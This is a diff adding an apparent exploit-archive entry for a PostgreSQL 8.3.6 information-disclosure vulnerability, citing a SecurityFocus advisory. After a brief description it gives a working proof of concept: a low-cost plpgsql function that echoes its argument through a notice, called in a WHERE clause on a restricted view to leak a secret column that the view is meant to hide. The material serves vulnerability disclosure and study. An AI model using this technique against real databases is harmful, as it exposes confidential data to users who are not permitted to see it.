@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/34069/info
+
+PostgreSQL is prone to an information-disclosure vulnerability.
+
+Local attackers can exploit this issue to obtain sensitive information that may lead to further attacks.
+
+PostgreSQL 8.3.6 is vulnerable; other versions may also be affected. 
+
+CREATE OR REPLACE FUNCTION do_tell(anyelement)
+RETURNS bool
+COST 0.1
+VOLATILE
+LANGUAGE plpgsql
+AS $body$
+BEGIN
+raise notice 'hah: %s', $1::text;
+return true;
+END;
+$body$;
+
+SELECT * FROM restricted_view WHERE do_tell(secret_column); 
